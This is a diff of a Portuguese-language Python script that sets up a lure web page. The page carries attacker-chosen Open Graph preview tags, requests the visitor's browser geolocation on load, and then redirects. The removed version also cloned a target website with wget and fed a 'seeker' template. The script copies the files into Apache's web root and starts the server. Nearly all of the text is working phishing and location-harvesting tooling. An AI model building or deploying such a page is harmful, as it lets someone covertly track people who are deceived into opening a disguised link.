@@ -1,51 +1,27 @@
-#!/usr/bin/env python3
-
 import os
 import subprocess
-import shutil
-import socket
-from pathlib import Path
-from urllib.parse import urlparse
-import sys
 
-# Cores para impressão no terminal
-R = '\033[31m'  # Vermelho
-G = '\033[32m'  # Verde
-C = '\033[36m'  # Ciano
-W = '\033[0m'   # Branco
+# Cores
+R = '\033[91m'
+G = '\033[92m'
+Y = '\033[93m'
+C = '\033[96m'
+W = '\033[0m'
 
-def get_private_ip():
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.settimeout(0)
-        s.connect(('8.8.8.8', 1))
-        ip = s.getsockname()[0]
-        s.close()
-        return ip
-    except Exception as e:
-        print(f'{R}[ERRO]{W} Não foi possível obter o IP privado: {e}')
-        return '127.0.0.1'
-
-def clone_website(url, target_dir):
-    print(f'{C}[INFO]{W} Clonando o site {url} com wget...')
-    os.makedirs(target_dir, exist_ok=True)
-    cmd = [
-        'wget', '--no-check-certificate', '--mirror',
-        '--convert-links', '--adjust-extension',
-        '--page-requisites', '--no-parent',
-        url,
-        '-P', target_dir
+def print_ascii():
+    ascii_art = [
+        " ____  __________  _____ ____________",
+        "/ __ \\/ ____/ __ \\/ ___// ____/ ____/",
+        "/ / / / __/ / / / /\\__ \\/ __/ / /",
+        "/ /_/ / /___/ /_/ /___/ / /___/ /___",
+        "/_____/_____/_____//____/_____/\\____/"
     ]
-    ret = subprocess.call(cmd)
-    if ret == 0:
-        print(f'{G}[SUCESSO]{W} Site clonado em {target_dir}')
-    else:
-        print(f'{R}[ERRO]{W} Falha ao clonar o site (código {ret})')
-    return target_dir
+    print(C)
+    for linha in ascii_art:
+        print(f'echo -e "{linha}"')
+    print(W)
 
-def create_initial_index(redirect_url, sitename, title, desc, image_url, home_dir):
-    print(f'{C}[INFO]{W} Criando arquivo index.html com redirecionamento...')
-
+def criar_index_html(redirect_url, title, sitename, desc, image_url):
     html = f"""<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -65,77 +41,72 @@ def create_initial_index(redirect_url, sitename, title, desc, image_url, home_di
 </head>
 <body onload="information(); locate(function() {{ window.location = '{redirect_url}/index2.html'; }}, function() {{ document.body.innerHTML = 'Erro ao localizar.'; }} );">
 </body>
-</html>"""
-
-    tpl_dir = os.path.join(home_dir, 'seeker/template/custom_og_tags')
-    os.makedirs(tpl_dir, exist_ok=True)
-
-    index_path = os.path.join(tpl_dir, 'index.html')
-    with open(index_path, 'w', encoding='utf-8') as f:
+</html>
+"""
+    with open('index.html', 'w') as f:
         f.write(html)
+    print(f'{Y}[*]{W} index.html criado com geolocalização e redirecionamento.')
 
-    index_temp = os.path.join(tpl_dir, 'index_temp.html')
-    shutil.copy(index_path, index_temp)
+def criar_location_js():
+    os.makedirs('js', exist_ok=True)
+    location_js = """function information() {
+    console.log("Iniciando coleta de localização...");
+}
+function locate(success, error) {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+            console.log("Localização obtida.");
+            success(position);
+        }, function() {
+            console.log("Erro ao obter localização.");
+            error();
+        });
+    } else {
+        console.log("Geolocalização não suportada.");
+        error();
+    }
+}"""
+    with open('js/location.js', 'w') as f:
+        f.write(location_js)
+    print(f'{Y}[*]{W} location.js criado.')
 
-    print(f'{G}[SUCESSO]{W} Arquivo index.html criado em {index_path}')
-    return tpl_dir
-
-def copy_to_apache(src_dir, apache_dir='/var/www/html'):
-    print(f'{C}[INFO]{W} Copiando arquivos para {apache_dir}...')
-    for item in os.listdir(src_dir):
-        src = os.path.join(src_dir, item)
-        dst = os.path.join(apache_dir, item)
-        try:
-            shutil.copy(src, dst)
-            print(f'{G}[COPIADO]{W} {src} → {dst}')
-        except PermissionError:
-            print(f'{R}[PERMISSÃO NEGADA]{W} {src} → {dst}')
-        except Exception as e:
-            print(f'{R}[ERRO]{W} {src}: {e}')
+def copiar_arquivos():
+    print(f'{Y}[*]{W} Copiando arquivos para /var/www/html...')
+    os.system('sudo cp index.html /var/www/html/')
+    os.system('sudo mkdir -p /var/www/html/js')
+    os.system('sudo cp js/location.js /var/www/html/js/')
 
 def start_apache():
-    print(f'{C}[INFO]{W} Iniciando Apache...')
-    cmds = [
-        ['systemctl', 'start', 'apache2'],
-        ['service', 'apache2', 'start']
-    ]
-    for cmd in cmds:
-        try:
-            ret = subprocess.call(['sudo'] + cmd)
-            if ret == 0:
-                print(f'{G}[SUCESSO]{W} Apache iniciado com {" ".join(cmd)}')
-                return
-        except Exception as e:
-            print(f'{R}[ERRO]{W} ao executar {" ".join(cmd)}: {e}')
-    print(f'{R}[FALHA]{W} Verifique se o Apache está instalado.')
+    print(f'{Y}[*]{W} Iniciando o Apache...')
+    result = subprocess.run(['sudo', 'service', 'apache2', 'start'], capture_output=True, text=True)
+    if result.returncode == 0:
+        return True
+    print(f'{R}[ERRO]{W} {result.stderr.strip()}')
+    return False
 
 def main():
-    if os.geteuid() != 0:
-        print(f'{R}[ERRO]{W} Execute como root (use sudo).')
-        sys.exit(1)
+    print_ascii()
+    destino = input(f'{C}[?]{W} URL de destino final (ex: https://exemplo.com): ').strip()
+    ip = input(f'{C}[?]{W} IP local (ex: 192.168.0.105): ').strip()
+    porta = input(f'{C}[?]{W} Porta (ex: 8080): ').strip()
+    title = input(f'{C}[?]{W} Título da aba (title): ').strip()
+    sitename = input(f'{C}[?]{W} Nome do site (og:site_name): ').strip()
+    desc = input(f'{C}[?]{W} Descrição (og:description): ').strip()
+    image_url = input(f'{C}[?]{W} URL da imagem (og:image): ').strip()
 
-    home = str(Path.home())
+    if not all([destino, ip, porta, title, sitename, desc, image_url]):
+        print(f'{R}[ERRO]{W} Todos os campos são obrigatórios.')
+        return
 
-    print(f'{C}===== CONFIGURAÇÃO DO CLONE ====={W}')
-    url = input('URL do site a ser clonado: ').strip()
-    port = input('Porta para hospedar (ex: 8080): ').strip()
-    title = input('Título da página (og:title): ').strip()
-    desc = input('Descrição (og:description): ').strip()
-    image_url = input('URL da imagem (og:image): ').strip()
+    redirect_url = f"http://{ip}:{porta}"
+    criar_index_html(redirect_url, title, sitename, desc, image_url)
+    criar_location_js()
+    copiar_arquivos()
 
-    private_ip = get_private_ip()
-    redirect_url = f'http://{private_ip}:{port}'
+    if start_apache():
+        print(f'{G}[OK]{W} Site hospedado em: {redirect_url}')
+    else:
+        print(f'{R}[ERRO]{W} Apache não iniciado. O site **não está hospedado**.')
 
-    parsed = urlparse(url)
-    hostname = parsed.hostname or url
-    sitename = hostname.split('.')[0]
-
-    target_dir = clone_website(url, '/var/www/html/site_clone')
-    tpl_dir = create_initial_index(redirect_url, sitename, title, desc, image_url, home)
-    copy_to_apache(tpl_dir)
-    start_apache()
-
-    print(f'{G}[OK]{W} Site hospedado em: {redirect_url}')
-
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
